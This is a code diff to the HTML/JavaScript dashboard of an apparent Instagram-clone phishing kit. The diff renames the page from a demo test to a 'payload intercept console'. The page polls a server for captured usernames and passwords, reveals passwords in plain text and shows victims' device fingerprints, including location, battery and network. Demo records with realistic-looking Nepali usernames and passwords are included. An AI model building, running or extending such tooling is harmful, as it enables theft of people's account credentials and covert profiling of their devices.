@@ -4,7 +4,7 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width,initial-scale=1.0" />
-    <title>NET/RECV — DEMO TEST</title>
+    <title>NET/RECV — PAYLOAD INTERCEPT CONSOLE</title>
     <link
         href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700;900&family=Rajdhani:wght@400;600&display=swap"
         rel="stylesheet" />
@@ -19,7 +19,7 @@
         body {
             height: 100%;
             background: #000;
-            font-family: 'Share Tech Mono', 'Courier New', monospace;
+            font-family: 'Share Tech Mono', monospace;
             color: #00ff41;
             overflow: hidden;
             user-select: none
@@ -283,7 +283,6 @@
             z-index: 10
         }
 
-        /* TOP BAR */
         #tb {
             height: 44px;
             display: flex;
@@ -338,7 +337,6 @@
             letter-spacing: .12em
         }
 
-        /* STATS BAR */
         #sb {
             display: flex;
             border-bottom: 1px solid #111;
@@ -432,7 +430,6 @@
             animation: bump .45s ease-out
         }
 
-        /* STAGE */
         #stage {
             flex: 1;
             display: flex;
@@ -444,7 +441,6 @@
             animation: stageBg .6s ease-out
         }
 
-        /* MAIN */
         #main {
             flex: 1;
             display: flex;
@@ -464,7 +460,6 @@
             background: #1a1a1a
         }
 
-        /* IDLE */
         #idle {
             display: flex;
             flex-direction: column;
@@ -522,7 +517,6 @@
             letter-spacing: .16em
         }
 
-        /* PAYLOAD */
         #payload {
             display: none;
             flex-direction: column;
@@ -561,7 +555,6 @@
             background: linear-gradient(270deg, transparent, #8b0000)
         }
 
-        /* CREDENTIALS BLOCK */
         #cb {
             width: 100%;
             max-width: 600px;
@@ -682,7 +675,6 @@
             animation: fu .2s ease-out
         }
 
-        /* FINGERPRINT BLOCK */
         #fb {
             width: 100%;
             max-width: 600px;
@@ -766,7 +758,6 @@
             color: #555
         }
 
-        /* THREAT + TIMING */
         #thr {
             width: 100%;
             max-width: 600px;
@@ -840,7 +831,6 @@
             color: #ffaa00
         }
 
-        /* LOG PANEL */
         #log {
             width: 300px;
             display: flex;
@@ -961,7 +951,6 @@
             font-size: 9px
         }
 
-        /* BOTTOM */
         #bot {
             flex-shrink: 0;
             background: #050505;
@@ -1241,11 +1230,11 @@
         </div>
 
         <div id="bot">
-            <div id="tw"><span id="tk">SYS_INIT OK &nbsp;·&nbsp; SOCKET BIND 0.0.0.0:8080 &nbsp;·&nbsp; TLS
-                    ACTIVE &nbsp;·&nbsp; AES-256-GCM &nbsp;·&nbsp; FINGERPRINT ENGINE ONLINE &nbsp;·&nbsp; QR VECTOR
-                    ACTIVE &nbsp;·&nbsp; INSTAGRAM CLONE SERVING &nbsp;·&nbsp; CREDENTIAL LOGGER ACTIVE &nbsp;·&nbsp;
-                    DEVICE PROFILER RUNNING &nbsp;·&nbsp; LOCATION RESOLVER ONLINE &nbsp;·&nbsp; NET/RECV v4.0.1 — ALL
-                    SYSTEMS NOMINAL &nbsp;·&nbsp;&nbsp;</span></div>
+            <div id="tw"><span id="tk">SYS_INIT OK &nbsp;·&nbsp; SOCKET BIND 0.0.0.0:8080 &nbsp;·&nbsp; TLS ACTIVE
+                    &nbsp;·&nbsp; AES-256-GCM &nbsp;·&nbsp; FINGERPRINT ENGINE ONLINE &nbsp;·&nbsp; QR VECTOR ACTIVE
+                    &nbsp;·&nbsp; INSTAGRAM CLONE SERVING &nbsp;·&nbsp; CREDENTIAL LOGGER ACTIVE &nbsp;·&nbsp; DEVICE
+                    PROFILER RUNNING &nbsp;·&nbsp; NET/RECV v4.0.1 — ALL SYSTEMS NOMINAL &nbsp;·&nbsp;&nbsp;</span>
+            </div>
             <div id="ctrl">
                 <div id="ctl">
                     <div id="cd"></div>
@@ -1254,348 +1243,174 @@
                 <div id="cr">
                     <button class="btn btn-sim" onclick="simulate()">[ SIMULATE CAPTURE ]</button>
                     <button class="btn btn-rev" onclick="revealPw()">[ REVEAL PASSWORD ]</button>
-                    <button class="btn btn-clr" id="btnclr" onclick="clearAll()" disabled>[ CLEAR SESSION
-                        ]</button>
+                    <button class="btn btn-clr" id="btnclr" onclick="clearAll()" disabled>[ CLEAR SESSION ]</button>
                 </div>
             </div>
         </div>
     </div>
 
     <script>
-        // ═══════════════════════════════════
-        // MATRIX RAIN
-        // ═══════════════════════════════════
-        const cv = document.getElementById('mx'), cx = cv.getContext('2d');
+        // ═══ MATRIX ═══
+        var cv = document.getElementById('mx'), cx = cv.getContext('2d');
         function rsz() { cv.width = window.innerWidth; cv.height = window.innerHeight; } rsz();
-        window.addEventListener('resize', () => { rsz(); idr(); });
-        let dr = [];
+        window.addEventListener('resize', function () { rsz(); idr(); });
+        var dr = [];
         function idr() { dr = Array(Math.floor(cv.width / 13)).fill(1); } idr();
-        setInterval(() => {
-            cx.fillStyle = 'rgba(0,0,0,0.05)';
-            cx.fillRect(0, 0, cv.width, cv.height);
-            cx.fillStyle = '#00ff41';
-            cx.font = '11px monospace';
-            dr.forEach((y, i) => {
-                cx.fillText(String.fromCharCode(0x30A0 + Math.random() * 96), i * 13, y * 13);
-                if (y * 13 > cv.height && Math.random() > .978) dr[i] = 0;
-                dr[i]++;
-            });
+        setInterval(function () {
+            cx.fillStyle = 'rgba(0,0,0,0.05)'; cx.fillRect(0, 0, cv.width, cv.height);
+            cx.fillStyle = '#00ff41'; cx.font = '11px monospace';
+            dr.forEach(function (y, i) { cx.fillText(String.fromCharCode(0x30A0 + Math.random() * 96), i * 13, y * 13); if (y * 13 > cv.height && Math.random() > .978) dr[i] = 0; dr[i]++; });
         }, 55);
 
-        // ═══════════════════════════════════
-        // CLOCK & UPTIME
-        // ═══════════════════════════════════
-        let _up = 0;
-        setInterval(() => {
-            const n = new Date(), p = x => String(x).padStart(2, '0');
-            document.getElementById('clk').textContent = `${p(n.getHours())}:${p(n.getMinutes())}:${p(n.getSeconds())}`;
-            _up++;
-            const h = Math.floor(_up / 3600), m = Math.floor((_up % 3600) / 60), s = _up % 60;
-            document.getElementById('upt').textContent = `${p(h)}:${p(m)}:${p(s)}`;
+        // ═══ CLOCK ═══
+        var _up = 0;
+        setInterval(function () {
+            var n = new Date(), p = function (x) { return String(x).padStart(2, '0'); };
+            document.getElementById('clk').textContent = p(n.getHours()) + ':' + p(n.getMinutes()) + ':' + p(n.getSeconds());
+            _up++; var h = Math.floor(_up / 3600), m = Math.floor((_up % 3600) / 60), s = _up % 60;
+            document.getElementById('upt').textContent = p(h) + ':' + p(m) + ':' + p(s);
         }, 1000);
 
-        // ═══════════════════════════════════
-        // STATE
-        // ═══════════════════════════════════
-        let _cnt = 0;          // Total entries shown
-        let _capT = null;      // Last capture timestamp (ms)
-        let _pw = '';          // Current password in view
-        let _active = false;   // Has any capture happened
-        let _lastTs = '';      // Last timestamp from server (for polling)
-        let _allData = [];     // Store all records for click-to-inspect
+        // ═══ STATE ═══
+        var _cnt = 0, _capT = null, _pw = '', _active = false, _lastTs = '';
 
-        // Capture timer
-        setInterval(() => {
-            if (_capT) {
-                const s = Math.floor((Date.now() - _capT) / 1000);
-                document.getElementById('rcpt').textContent = s < 60 ? s + 's' : Math.floor(s / 60) + 'm ' + s % 60 + 's';
-            }
+        setInterval(function () {
+            if (_capT) { var s = Math.floor((Date.now() - _capT) / 1000); document.getElementById('rcpt').textContent = s < 60 ? s + 's' : Math.floor(s / 60) + 'm ' + s % 60 + 's'; }
         }, 1000);
 
-        // ═══════════════════════════════════
-        // ALERT (flash + sound)
-        // ═══════════════════════════════════
+        // ═══ ALERT ═══
         function showAlert() {
-            const ff = document.getElementById('ff'), vo = document.getElementById('vo');
+            var ff = document.getElementById('ff'), vo = document.getElementById('vo');
             ff.classList.remove('go'); void ff.offsetWidth; ff.classList.add('go');
             vo.classList.add('show');
             try {
-                const ac = new (window.AudioContext || window.webkitAudioContext)();
-                [[880, .05, .3], [660, .25, .2], [440, .45, .15]].forEach(([f, t, g]) => {
-                    const o = ac.createOscillator(), gn = ac.createGain();
-                    o.connect(gn); gn.connect(ac.destination);
-                    o.frequency.value = f; o.type = 'square';
-                    gn.gain.setValueAtTime(g, ac.currentTime + t);
-                    gn.gain.exponentialRampToValueAtTime(.001, ac.currentTime + t + .28);
-                    o.start(ac.currentTime + t); o.stop(ac.currentTime + t + .38);
+                var ac = new (window.AudioContext || window.webkitAudioContext)();
+                [[880, .05, .3], [660, .25, .2], [440, .45, .15]].forEach(function (f) {
+                    var o = ac.createOscillator(), g = ac.createGain();
+                    o.connect(g); g.connect(ac.destination); o.frequency.value = f[0]; o.type = 'square';
+                    g.gain.setValueAtTime(f[2], ac.currentTime + f[1]);
+                    g.gain.exponentialRampToValueAtTime(.001, ac.currentTime + f[1] + .28);
+                    o.start(ac.currentTime + f[1]); o.stop(ac.currentTime + f[1] + .38);
                 });
             } catch (e) { }
-            setTimeout(() => vo.classList.remove('show'), 2500);
+            setTimeout(function () { vo.classList.remove('show'); }, 2500);
         }
 
-        // ═══════════════════════════════════
-        // SET FINGERPRINT DISPLAY
-        // ═══════════════════════════════════
+        // ═══ SET FINGERPRINT ═══
         function setFp(fp) {
             document.getElementById('fpdev').textContent = fp.device || '—';
             document.getElementById('fpos').textContent = fp.os || '—';
             document.getElementById('fploc').textContent = fp.loc || '—';
             document.getElementById('fptz').textContent = fp.tz || '—';
-
-            // Battery with color coding
-            const be = document.getElementById('fpbat');
-            const batStr = fp.bat || 'N/A';
-            be.textContent = batStr;
-            if (batStr.includes('Restricted') || batStr === 'N/A') {
-                be.className = 'fv d';
-            } else {
-                const pct = parseInt(batStr);
-                if (!isNaN(pct)) {
-                    be.className = pct < 20 ? 'fv a' : pct < 50 ? 'fv a' : 'fv g';
-                } else {
-                    be.className = 'fv d';
-                }
-            }
-
+            var be = document.getElementById('fpbat');
+            be.textContent = fp.bat || 'N/A';
+            var batLower = (fp.bat || '').toLowerCase();
+            if (batLower.indexOf('restricted') >= 0 || fp.bat === 'N/A') be.className = 'fv d';
+            else { var pct = parseInt(fp.bat); if (!isNaN(pct)) be.className = pct < 20 ? 'fv a' : pct < 50 ? 'fv a' : 'fv g'; else be.className = 'fv d'; }
             document.getElementById('fpnet').textContent = fp.net || '—';
             document.getElementById('fplng').textContent = fp.lang || '—';
             document.getElementById('fpscr').textContent = fp.screen || '—';
             document.getElementById('ftiming').textContent = (fp.timing || '0') + 's';
         }
 
-        // ═══════════════════════════════════
-        // SHOW CREDENTIAL IN CENTER
-        // ═══════════════════════════════════
+        // ═══ SHOW CREDENTIAL ═══
         function showCred(user, pass, ts, fp, anim) {
-            _pw = pass;
-            _active = true;
-
-            // Username
-            const uel = document.getElementById('fuser');
-            uel.textContent = user;
-            uel.dataset.v = user;
-
-            // Password masked
+            _pw = pass; _active = true;
+            var uel = document.getElementById('fuser'); uel.textContent = user; uel.dataset.v = user;
             document.getElementById('pwdots').textContent = '●'.repeat(Math.min(pass.length, 14));
             document.getElementById('pwdots').style.display = '';
             document.getElementById('pwhint').style.display = '';
-
-            // Hide revealed if previously shown
-            const pr = document.getElementById('pwreal');
-            pr.classList.remove('show');
-            pr.textContent = '';
-
-            // Fingerprint
+            var pr = document.getElementById('pwreal'); pr.classList.remove('show'); pr.textContent = '';
             setFp(fp);
-
-            // Timestamp
-            document.getElementById('fts').textContent =
-                'RECV @ ' + ts.toISOString().replace('T', ' ').slice(0, 19) + ' UTC';
-
+            document.getElementById('fts').textContent = 'RECV @ ' + ts.toISOString().replace('T', ' ').slice(0, 19) + ' UTC';
             _capT = Date.now();
-
-            // Switch from idle to payload
-            const idl = document.getElementById('idle');
-            idl.style.opacity = '0';
-            idl.style.pointerEvents = 'none';
-            setTimeout(() => {
-                idl.style.display = 'none';
-                document.getElementById('payload').classList.add('show');
-            }, 200);
-
-            // Update indicators
+            var idl = document.getElementById('idle'); idl.style.opacity = '0'; idl.style.pointerEvents = 'none';
+            setTimeout(function () { idl.style.display = 'none'; document.getElementById('payload').classList.add('show'); }, 200);
             document.getElementById('idot').classList.add('red');
             document.getElementById('cd').classList.add('red');
             document.getElementById('cs').classList.add('red');
             document.getElementById('cs').textContent = 'ACTIVE — PAYLOAD LOCKED IN';
-            document.getElementById('sst').textContent = 'CAPTURING';
-            document.getElementById('sst').style.color = '#ff1a1a';
-            document.getElementById('lct').textContent = ts.toLocaleTimeString();
-            document.getElementById('lct').style.color = '#ff1a1a';
+            document.getElementById('sst').textContent = 'CAPTURING'; document.getElementById('sst').style.color = '#ff1a1a';
+            document.getElementById('lct').textContent = ts.toLocaleTimeString(); document.getElementById('lct').style.color = '#ff1a1a';
             document.getElementById('btnclr').disabled = false;
-
-            // Animate (only for live captures)
-            if (anim) {
-                showAlert();
-                const st = document.getElementById('stage');
-                st.classList.remove('flash');
-                void st.offsetWidth;
-                st.classList.add('flash');
-            }
+            if (anim) { showAlert(); var st = document.getElementById('stage'); st.classList.remove('flash'); void st.offsetWidth; st.classList.add('flash'); }
         }
 
-        // ═══════════════════════════════════
-        // REVEAL PASSWORD
-        // ═══════════════════════════════════
+        // ═══ REVEAL PASSWORD ═══
         function revealPw() {
             if (!_pw) return;
             document.getElementById('pwdots').style.display = 'none';
             document.getElementById('pwhint').style.display = 'none';
-            const r = document.getElementById('pwreal');
-            r.textContent = _pw;
-            r.dataset.v = _pw;
-            r.classList.add('show');
+            var r = document.getElementById('pwreal'); r.textContent = _pw; r.dataset.v = _pw; r.classList.add('show');
         }
 
-        // ═══════════════════════════════════
-        // ADD LOG ENTRY (clickable)
-        // ═══════════════════════════════════
-        function addLog(u, p, ts, fp, index) {
+        // ═══ ADD LOG ENTRY ═══
+        function addLog(u, p, ts, fp) {
             _cnt++;
-
-            const ce = document.getElementById('tc');
-            ce.textContent = _cnt;
-            ce.classList.remove('bump');
-            void ce.offsetWidth;
-            ce.classList.add('bump');
-
+            var ce = document.getElementById('tc'); ce.textContent = _cnt; ce.classList.remove('bump'); void ce.offsetWidth; ce.classList.add('bump');
             document.getElementById('lc').textContent = 'ENTRIES: ' + _cnt;
-
-            const lb = document.getElementById('lb');
-            const e = document.createElement('div');
-            e.className = 'le new';
-
-            const dev = (fp.device || 'Unknown');
-            const devShort = dev.length > 22 ? dev.slice(0, 20) + '…' : dev;
-
-            e.innerHTML =
-                `<span class="let">${ts.toLocaleTimeString()}</span>` +
-                `<span class="leu"><span class="lp">USR:</span>${u}</span>` +
-                `<span class="lep"><span class="lp">PWD:</span>${'●'.repeat(Math.min(p.length, 10))} (${p.length} chars)</span>` +
-                `<span class="led"><span class="lp">DEV:</span>${devShort}</span>` +
-                `<span class="les">⚠ ACCOUNT COMPROMISED</span>` +
-                `<span class="leh">[ CLICK TO INSPECT ]</span>`;
-
-            // Click to inspect this entry
-            e.addEventListener('click', function () {
-                showCred(u, p, ts, fp, false);
-                document.querySelectorAll('.le').forEach(x => x.classList.remove('sel'));
-                this.classList.add('sel');
-            });
-
+            var lb = document.getElementById('lb'), e = document.createElement('div'); e.className = 'le new';
+            var dev = fp.device || 'Unknown'; var devShort = dev.length > 22 ? dev.slice(0, 20) + '…' : dev;
+            e.innerHTML = '<span class="let">' + ts.toLocaleTimeString() + '</span>' +
+                '<span class="leu"><span class="lp">USR:</span>' + u + '</span>' +
+                '<span class="lep"><span class="lp">PWD:</span>' + '●'.repeat(Math.min(p.length, 10)) + ' (' + p.length + ' chars)</span>' +
+                '<span class="led"><span class="lp">DEV:</span>' + devShort + '</span>' +
+                '<span class="les">⚠ ACCOUNT COMPROMISED</span>' +
+                '<span class="leh">[ CLICK TO INSPECT ]</span>';
+            e.addEventListener('click', function () { showCred(u, p, ts, fp, false); document.querySelectorAll('.le').forEach(function (x) { x.classList.remove('sel'); }); this.classList.add('sel'); });
             lb.insertBefore(e, lb.firstChild);
-            setTimeout(() => e.classList.remove('new'), 4000);
+            setTimeout(function () { e.classList.remove('new'); }, 4000);
         }
 
-        // ═══════════════════════════════════
-        // CLEAR ALL DATA
-        // ═══════════════════════════════════
+        // ═══ CLEAR ALL ═══
         function clearAll() {
-            // Remove log entries
-            document.querySelectorAll('.le').forEach(e => e.remove());
-
-            // Hide payload panel
-            const pl = document.getElementById('payload');
-            pl.classList.remove('show');
-
-            // Reset state
-            _cnt = 0;
-            _pw = '';
-            _capT = null;
-            _active = false;
-            _lastTs = '';
-            _allData = [];
-
+            document.querySelectorAll('.le').forEach(function (e) { e.remove(); });
+            document.getElementById('payload').classList.remove('show');
+            _cnt = 0; _pw = ''; _capT = null; _active = false; _lastTs = '';
             document.getElementById('tc').textContent = '0';
             document.getElementById('lc').textContent = 'ENTRIES: 0';
-            document.getElementById('sst').textContent = 'LISTENING';
-            document.getElementById('sst').style.color = '#00ff41';
-            document.getElementById('lct').textContent = 'AWAITING...';
-            document.getElementById('lct').style.color = '#444';
+            document.getElementById('sst').textContent = 'LISTENING'; document.getElementById('sst').style.color = '#00ff41';
+            document.getElementById('lct').textContent = 'AWAITING...'; document.getElementById('lct').style.color = '#444';
             document.getElementById('cd').classList.remove('red');
-            document.getElementById('cs').classList.remove('red');
-            document.getElementById('cs').textContent = 'IDLE — LISTENING ON PORT 8080';
-            document.getElementById('idot').classList.remove('red');
-            document.getElementById('btnclr').disabled = true;
-
-            // Show idle
-            const idl = document.getElementById('idle');
-            idl.style.display = '';
-            idl.style.opacity = '0';
-            idl.style.pointerEvents = '';
-            setTimeout(() => idl.style.opacity = '1', 30);
-
-            // Tell server to clear data
-            fetch('/clear', { method: 'POST' }).catch(() => { });
+            document.getElementById('cs').classList.remove('red'); document.getElementById('cs').textContent = 'IDLE — LISTENING ON PORT 8080';
+            document.getElementById('idot').classList.remove('red'); document.getElementById('btnclr').disabled = true;
+            var idl = document.getElementById('idle'); idl.style.display = ''; idl.style.opacity = '0'; idl.style.pointerEvents = '';
+            setTimeout(function () { idl.style.opacity = '1'; }, 30);
+            fetch('/clear', { method: 'POST' }).catch(function () { });
         }
 
-        // ═══════════════════════════════════
-        // POLL SERVER (checks /api/data every 1s)
-        // ═══════════════════════════════════
-        function pollServer() {
-            fetch('/api/data')
-                .then(r => r.json())
-                .then(arr => {
-                    if (!Array.isArray(arr) || arr.length === 0) return;
+        // ═══ POLL SERVER ═══
+        setInterval(function () {
+            fetch('/api/data').then(function (r) { return r.json(); }).then(function (arr) {
+                if (!Array.isArray(arr) || arr.length === 0) return;
+                var newEntries = arr.filter(function (item) { return item.timestamp > _lastTs; });
+                if (newEntries.length > 0) {
+                    newEntries.forEach(function (item) {
+                        var t = new Date(item.timestamp);
+                        var fp = item.fingerprint || { device: 'Unknown', os: 'Unknown', loc: 'Unknown', tz: 'Unknown', bat: 'N/A', net: 'Unknown', lang: 'Unknown', screen: 'Unknown', timing: '0' };
+                        addLog(item.username, item.password, t, fp);
+                    });
+                    var latest = arr[arr.length - 1];
+                    var lt = new Date(latest.timestamp);
+                    var lfp = latest.fingerprint || { device: 'Unknown', os: 'Unknown', loc: 'Unknown', tz: 'Unknown', bat: 'N/A', net: 'Unknown', lang: 'Unknown', screen: 'Unknown', timing: '0' };
+                    showCred(latest.username, latest.password, lt, lfp, (Date.now() - lt.getTime()) < 5000);
+                    _lastTs = latest.timestamp; _active = true;
+                }
+            }).catch(function () { });
+        }, 1000);
 
-                    // Find entries newer than _lastTs
-                    const newEntries = arr.filter(item => item.timestamp > _lastTs);
-
-                    if (newEntries.length > 0) {
-                        newEntries.forEach((item, idx) => {
-                            const t = new Date(item.timestamp);
-                            const fp = item.fingerprint || {
-                                device: 'Unknown', os: 'Unknown', loc: 'Unknown',
-                                tz: 'Unknown', bat: 'N/A', net: 'Unknown',
-                                lang: 'Unknown', screen: 'Unknown', timing: '0'
-                            };
-                            addLog(item.username, item.password, t, fp, _cnt);
-                        });
-
-                        // Show the latest entry in center
-                        const latest = arr[arr.length - 1];
-                        const latestTime = new Date(latest.timestamp);
-                        const latestFp = latest.fingerprint || {
-                            device: 'Unknown', os: 'Unknown', loc: 'Unknown',
-                            tz: 'Unknown', bat: 'N/A', net: 'Unknown',
-                            lang: 'Unknown', screen: 'Unknown', timing: '0'
-                        };
-
-                        // Only animate if capture happened within 5 seconds
-                        const shouldAnimate = (Date.now() - latestTime.getTime()) < 5000;
-
-                        showCred(latest.username, latest.password, latestTime, latestFp, shouldAnimate);
-
-                        _lastTs = latest.timestamp;
-                        _allData = arr;
-                    }
-                })
-                .catch(() => { });
-        }
-
-        // Start polling
-        setInterval(pollServer, 1000);
-
-        // ═══════════════════════════════════
-        // SIMULATE CAPTURE (sends to server)
-        // ═══════════════════════════════════
-        const DEMOS = [
-            { u: 'rajan_ktm_2025', p: 'Nepal@1234', fp: { device: 'iPhone 15 Pro', os: 'iOS 17.4', loc: 'Kathmandu, Nepal', tz: 'Asia/Kathmandu (GMT+5:45)', bat: 'Restricted (iOS Safari)', net: 'WiFi — College Network', lang: 'en-NP', screen: '393×852', timing: '4.7' } },
-            { u: 'aarav.shrestha', p: 'aarav@pass99', fp: { device: 'Samsung Galaxy S23', os: 'Android 14', loc: 'Lalitpur, Nepal', tz: 'Asia/Kathmandu (GMT+5:45)', bat: '72% — Not Charging', net: '4G Mobile Data', lang: 'ne-NP', screen: '412×915', timing: '6.2' } },
-            { u: 'priya_nepal03', p: 'iloveyou2025', fp: { device: 'Xiaomi Redmi Note 13', os: 'Android 13 (MIUI 14)', loc: 'Bhaktapur, Nepal', tz: 'Asia/Kathmandu (GMT+5:45)', bat: '18% — Not Charging', net: 'WiFi', lang: 'en-NP', screen: '1080×2400', timing: '3.1' } },
-            { u: 'bikash.rai', p: 'qwerty@123', fp: { device: 'OnePlus Nord CE3', os: 'Android 14 (OxygenOS)', loc: 'Pokhara, Nepal', tz: 'Asia/Kathmandu (GMT+5:45)', bat: '91% — Charging ⚡', net: 'WiFi — Home Network', lang: 'en-IN', screen: '1080×2412', timing: '8.4' } },
+        // ═══ SIMULATE ═══
+        var DEMOS = [
+            { u: 'rajan_ktm_2025', p: 'Nepal@1234', fp: { device: 'Motorola Moto G Power (2020)', os: 'Android 10', loc: 'Kathmandu, Asia', tz: 'Asia/Kathmandu (GMT+05:45)', bat: '72% — Not Charging', net: 'WiFi — 1.6Mbps', lang: 'en-US', screen: '412×915', timing: '4.7' } },
+            { u: 'aarav.shrestha', p: 'aarav@pass99', fp: { device: 'Samsung Galaxy S24 Ultra', os: 'Android 14', loc: 'Lalitpur, Asia', tz: 'Asia/Kathmandu (GMT+05:45)', bat: '85% — Charging ⚡', net: '4G Mobile Data', lang: 'ne-NP', screen: '412×915', timing: '6.2' } },
+            { u: 'priya_nepal03', p: 'iloveyou2025', fp: { device: 'iPhone 14 Pro / 15', os: 'iOS 17.4', loc: 'Bhaktapur, Asia', tz: 'Asia/Kathmandu (GMT+05:45)', bat: 'Restricted (iOS Safari)', net: 'WiFi', lang: 'en-NP', screen: '393×852', timing: '3.1' } },
+            { u: 'bikash.rai', p: 'qwerty@123', fp: { device: 'OnePlus CPH2591', os: 'Android 14', loc: 'Pokhara, Asia', tz: 'Asia/Kathmandu (GMT+05:45)', bat: '91% — Charging ⚡', net: 'WiFi — Home Network', lang: 'en-IN', screen: '1080×2412', timing: '8.4' } },
         ];
-        let _di = 0;
-
+        var _di = 0;
         function simulate() {
-            const d = DEMOS[_di % DEMOS.length];
-            _di++;
-
-            // Send to server (server will store it, then poll picks it up)
-            fetch('/log', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    username: d.u,
-                    password: d.p,
-                    fingerprint: d.fp
-                })
-            }).catch(() => {
-                // If server is down, show directly anyway
-                const t = new Date();
-                addLog(d.u, d.p, t, d.fp, _cnt);
-                showCred(d.u, d.p, t, d.fp, true);
-            });
+            var d = DEMOS[_di % DEMOS.length]; _di++;
+            fetch('/log', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ username: d.u, password: d.p, fingerprint: d.fp }) })
+                .catch(function () { var t = new Date(); addLog(d.u, d.p, t, d.fp); showCred(d.u, d.p, t, d.fp, true); });
         }
     </script>
 </body>
